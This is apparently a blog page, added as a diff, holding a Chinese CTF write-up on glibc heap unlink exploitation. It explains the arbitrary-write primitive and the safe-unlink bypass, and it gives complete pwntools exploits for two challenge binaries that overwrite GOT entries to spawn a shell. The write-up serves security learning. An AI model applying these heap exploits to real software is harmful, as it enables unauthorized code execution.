@@ -1,0 +1,806 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/chtholly1.jpg">
+  <link rel="icon" href="/img/chtholly1.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#4c81b9">
+  <meta name="author" content="Isolator">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="unlink">
+<meta property="og:type" content="article">
+<meta property="og:title" content="unlink">
+<meta property="og:url" content="https://isolator-1.github.io/2022/11/25/ctf-pwn/unlink/index.html">
+<meta property="og:site_name" content="Isolator&#39;s Blog">
+<meta property="og:description" content="unlink">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://isolator-1.github.io/img/ctf-pwn/unlink/1.jpg">
+<meta property="og:image" content="https://isolator-1.github.io/img/ctf-pwn/%5BZJCTF2019%5DEasyHeap/1.jpg">
+<meta property="og:image" content="https://isolator-1.github.io/img/ctf-pwn/%5BZJCTF2019%5DEasyHeap/2.jpg">
+<meta property="og:image" content="https://isolator-1.github.io/img/ctf-pwn/%5BZJCTF2019%5DEasyHeap/3.jpg">
+<meta property="article:published_time" content="2022-11-25T02:19:00.000Z">
+<meta property="article:modified_time" content="2024-07-23T06:23:00.560Z">
+<meta property="article:author" content="Isolator">
+<meta property="article:tag" content="ctf-pwn">
+<meta property="article:tag" content="heap">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://isolator-1.github.io/img/ctf-pwn/unlink/1.jpg">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>unlink - Isolator&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"isolator-1.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":1},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>_φ_(．．) Chtholly Nota Seniorious</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                Links
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/chtholly2.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="unlink"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-11-25 10:19" pubdate>
+          November 25, 2022 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.4k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          46 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">unlink</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>原理</p>
+<blockquote>
+<p>以下内容一律假设 sz = 4 bytes  ，32位系统</p>
+</blockquote>
+<h4 id="unlink时向任意地址写入数据原理"><a href="#unlink时向任意地址写入数据原理" class="headerlink" title="unlink时向任意地址写入数据原理"></a>unlink时向任意地址写入数据原理</h4><p>假设需要从bin中摘除一个<strong>首地址为P</strong>的chunk</p>
+<p>32位系统下，fd相对于块首的偏移为8（prevsize和size都是4字节），bk偏移为12</p>
+<p>即 <code>fd = P+8 </code> ，<code>bk = P+12</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">// unlink时需要 将P.fd指向的块的bk 赋值为 P.bk上的值</span><br>*(*(P+<span class="hljs-number">8</span>)+<span class="hljs-number">12</span>) = *(P+<span class="hljs-number">12</span>)<br><span class="hljs-comment">// 将P.bk指向的块的fd 赋值为 P.fd上的值</span><br>*(*(P+<span class="hljs-number">12</span>)+<span class="hljs-number">8</span>) = *(P+<span class="hljs-number">8</span>)<br></code></pre></td></tr></table></figure>
+
+<p>假设想要向0x4000000C这个地址上写入0xdeadbeef这个值</p>
+<p>只需将<code>*(P+8)</code>赋值为0x40000000，将<code>*(P+12)</code>赋值为0xdeadbeef，在unlink时就会完成赋值</p>
+<p>这种方法是将fd设置为了target addr - 12 ，bk设置为了expect value</p>
+<blockquote>
+<p>也可以将fd设置为expect value，bk设置为target addr - 8，但是后文默认均使用前一种攻击方法</p>
+</blockquote>
+<p>unlink漏洞同时向两个地址进行了写入，所以在保证targe taddr -12 可以写入的同时，也要保证expect value + 8 有写入权限</p>
+<h4 id="上面这些都没用"><a href="#上面这些都没用" class="headerlink" title="上面这些都没用"></a>上面这些都没用</h4><p><img src="/img/ctf-pwn/unlink/1.jpg" srcset="/img/loading.gif" lazyload></p>
+<h4 id="加入检查机制之后"><a href="#加入检查机制之后" class="headerlink" title="加入检查机制之后"></a>加入检查机制之后</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C">FD = P-&gt;fd;<br>BK = P-&gt;bk;<br><span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))                      <br>  malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV); <br>FD-&gt;bk = BK;<br>BK-&gt;fd = FD;<br></code></pre></td></tr></table></figure>
+
+<p>因此溢出时需要额外保证以下条件</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lisp">*(<span class="hljs-name">*</span>(<span class="hljs-name">P+8</span>) <span class="hljs-number">+12</span>) == P<br>*(<span class="hljs-name">*</span>(<span class="hljs-name">P+12</span>)+ <span class="hljs-number">8</span>) == P<br></code></pre></td></tr></table></figure>
+
+<p>所以需要找到堆管理列表里面指向chunk P的指针<strong>ptr</strong>，让P的fd指向ptr-12，P的bk指向ptr-8，这样P-&gt;fd-&gt;bk指向P，P-&gt;bk-&gt;fd也指向P。</p>
+<p>绕过if判断之后，下面两条赋值语句首先将 FD-&gt;bk（也就是ptr）指向了BK，再将BK-&gt;fd（还是ptr，又改变了一次ptr）指向了FD。</p>
+<p>因此后面这两条赋值语句确实完成了FD和BK unlink 的效果，唯一被改变的是ptr，它从原本指向chunk p，变成了*(ptr - 12)</p>
+<h3 id="zctf2016-note2"><a href="#zctf2016-note2" class="headerlink" title="zctf2016_note2"></a>zctf2016_note2</h3><p><strong>需要注意的是unlink的fakechunk大小不能小于max fastbin，因为fastbin里的根本没有把下一个inuse bit置零，也就不会存在unlink</strong></p>
+<p>使用了one gadget，还有覆盖atoi的got表都成功了，但是覆盖free的got表，再delete(2)却不能成功，不知道原因</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><span class="hljs-comment">#p = process(&quot;./note2&quot;)</span><br>e = ELF(<span class="hljs-string">&quot;./note2&quot;</span>)<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">25956</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">new</span>(<span class="hljs-params">size, content</span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;)&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size).encode())<br>    p.recvuntil(<span class="hljs-string">b&quot;:&quot;</span>)<br>    p.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;2&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index, choice, content</span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;3&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br>    p.recvuntil(<span class="hljs-string">&quot;]&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(choice).encode())<br>    p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>    p.sendline(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.recvuntil(<span class="hljs-string">b&quot;&gt;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-string">b&quot;4&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">b&quot;:&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(index).encode())<br><br>p.recvuntil(<span class="hljs-string">b&quot;:&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;abc&quot;</span>) <span class="hljs-comment"># name</span><br>p.recvuntil(<span class="hljs-string">b&quot;:&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;def&quot;</span>) <span class="hljs-comment"># addr</span><br><br>ptr = <span class="hljs-number">0x602120</span><br>fd = ptr - <span class="hljs-number">0x18</span><br>bk = ptr - <span class="hljs-number">0x10</span><br><br>new(<span class="hljs-number">0x80</span>, p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xa1</span>) + p64(fd) + p64(bk) )<br>new(<span class="hljs-number">0x0</span>,  <span class="hljs-string">b&#x27;\x01&#x27;</span> * <span class="hljs-number">0x10</span>)  <br>new(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>) <br><br>delete(<span class="hljs-number">1</span>)<br>new(<span class="hljs-number">0x0</span>, <span class="hljs-string">b&#x27;\0&#x27;</span> * <span class="hljs-number">16</span> + p64(<span class="hljs-number">0xa0</span>) + p64(<span class="hljs-number">0x90</span>))  <span class="hljs-comment"># overflow </span><br><br>delete(<span class="hljs-number">2</span>) <span class="hljs-comment"># unlink</span><br><br>free_got = e.got[<span class="hljs-string">&quot;free&quot;</span>]<br>atoi_got = e.got[<span class="hljs-string">&#x27;atoi&#x27;</span>]<br>edit(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;\x03&#x27;</span> * <span class="hljs-number">0x18</span> + p64(atoi_got))<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Content is &quot;</span>)<br><br>atoi = u64(p.recvuntil(<span class="hljs-string">b&quot;\n&quot;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>log.info(<span class="hljs-string">&quot;atoi :&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(atoi)))<br><br><br><span class="hljs-comment"># # local </span><br><span class="hljs-comment">#libc = ELF(&quot;./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6&quot;)</span><br><span class="hljs-comment">#libc.address =  atoi - libc.sym[&#x27;atoi&#x27;]</span><br><span class="hljs-comment">#system = libc.sym[&quot;system&quot;]</span><br><span class="hljs-comment">#log.info(&quot;system :&quot; + str(hex(system)))</span><br><span class="hljs-comment"># one_gadget :</span><br><span class="hljs-comment">#system = libc.address + 0xef9f4 </span><br><br><span class="hljs-comment"># remote</span><br>libc = LibcSearcher(<span class="hljs-string">&quot;atoi&quot;</span>, atoi)<br>offset = atoi - libc.dump(<span class="hljs-string">&#x27;atoi&#x27;</span>)<br>system = offset + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>edit(<span class="hljs-number">0</span>, <span class="hljs-number">1</span> , p64(system))<br><br>p.interactive() <span class="hljs-comment"># input /bin/sh</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="ZJCTF2019-EasyHeap"><a href="#ZJCTF2019-EasyHeap" class="headerlink" title="ZJCTF2019 EasyHeap"></a>ZJCTF2019 EasyHeap</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#[ZJCTF%202019]EasyHeap">https://buuoj.cn/challenges#[ZJCTF%202019]EasyHeap</a></p>
+<p>很明显在<code>ceate_heap</code>中size并没有存下来，然后<code>edit_heap</code>时也是用户自己输入size来编辑</p>
+<p>因此可以溢出</p>
+<p>checksec发现没有开启PIE，heaparray的地址可以直接使用</p>
+<ol>
+<li><p>首先申请三个chunk</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x90</span>,<span class="hljs-string">b&quot;MMMM&quot;</span>)<br>add(<span class="hljs-number">0x90</span>,<span class="hljs-string">b&quot;MMMM&quot;</span>)<br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>)<br></code></pre></td></tr></table></figure></li>
+<li><p>构造一个unlink需要在第一个chunk内构造一个fakechunk</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">fake_chunk = p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>) + p64(heaparray_addr-<span class="hljs-number">0x18</span>) + p64(heaparray_addr-<span class="hljs-number">0x10</span>)<br>fake_chunk = fake_chunk.ljust(<span class="hljs-number">0x90</span>,<span class="hljs-string">b&#x27;M&#x27;</span>)<br>fake_chunk += p64(<span class="hljs-number">0x90</span>) + p64(<span class="hljs-number">0xa0</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x100</span>,fake_chunk)<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/ctf-pwn/%5BZJCTF2019%5DEasyHeap/1.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>对于chunk 0，<code>fd = heaparray - 0x18</code> <code>bk = heaparray - 0x10</code>，unlink chunk 0 时会将heaparray[0]指向<code>heaparray - 0x18</code></p>
+</li>
+<li><p>这时delete(1)，会将chunk 1 和 fakechunk 合并起来放入 unsorted bin</p>
+<p><img src="/img/ctf-pwn/%5BZJCTF2019%5DEasyHeap/2.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>查看heaparray地址上的值：</p>
+<p><img src="/img/ctf-pwn/%5BZJCTF2019%5DEasyHeap/3.jpg" srcset="/img/loading.gif" lazyload></p>
+<p>说明fakechunk成功完成unlink操作，heaparray[0]指向了0x6020c8</p>
+</li>
+<li><p>这时edit(0)会从0x6020c8这个地址开始写，因此</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> +p64(free_got)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span> ,payload)<br></code></pre></td></tr></table></figure>
+
+<p>又一次覆盖了heaparray[0]，指向了<code>free@got</code></p>
+</li>
+<li><p>这时edit(0)会修改<code>free@got</code>的内容</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">edit(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>,p64(system_plt))<br></code></pre></td></tr></table></figure>
+
+<p>将其函数改为system函数的plt表</p>
+</li>
+<li><p>delete(2)会调用free(“/bin/sh”)，而free函数被替换成了system，因此得到了shell</p>
+</li>
+</ol>
+<h4 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>r = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27679</span>)<br>elf = ELF(<span class="hljs-string">&quot;./easyheap&quot;</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>    r.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;Size of Heap : &quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(size))<br>    r.recvuntil(<span class="hljs-string">&quot;Content of heap:&quot;</span>)<br>    r.sendline(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, size, content</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>    r.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(idx))<br>    r.recvuntil(<span class="hljs-string">&quot;Size of Heap : &quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(size))<br>    r.recvuntil(<span class="hljs-string">&quot;Content of heap : &quot;</span>)<br>    r.sendline(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    r.recvuntil(<span class="hljs-string">&quot;Your choice :&quot;</span>)<br>    r.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    r.recvuntil(<span class="hljs-string">&quot;Index :&quot;</span>)<br>    r.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>heaparray_addr = <span class="hljs-number">0x6020E0</span><br>system_plt = elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free_got = elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br><br>add(<span class="hljs-number">0x90</span>,<span class="hljs-string">b&quot;MMMM&quot;</span>)<br>add(<span class="hljs-number">0x90</span>,<span class="hljs-string">b&quot;MMMM&quot;</span>)<br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&quot;/bin/sh\x00&quot;</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br><br>fake_chunk = p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x91</span>) + p64(heaparray_addr-<span class="hljs-number">0x18</span>) + p64(heaparray_addr-<span class="hljs-number">0x10</span>)<br>fake_chunk = fake_chunk.ljust(<span class="hljs-number">0x90</span>,<span class="hljs-string">b&#x27;M&#x27;</span>)<br>fake_chunk += p64(<span class="hljs-number">0x90</span>) + p64(<span class="hljs-number">0xa0</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x100</span>,fake_chunk)<br>delete(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> +p64(free_got)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span> ,payload)<br><span class="hljs-comment">#gdb.attach(r)</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>,p64(system_plt))<br>delete(<span class="hljs-number">2</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/ctf-pwn/" class="category-chain-item">ctf-pwn</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/ctf-pwn/">#ctf-pwn</a>
+      
+        <a href="/tags/heap/">#heap</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>unlink</div>
+      <div>https://isolator-1.github.io/2022/11/25/ctf-pwn/unlink/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>Isolator</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>November 25, 2022</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
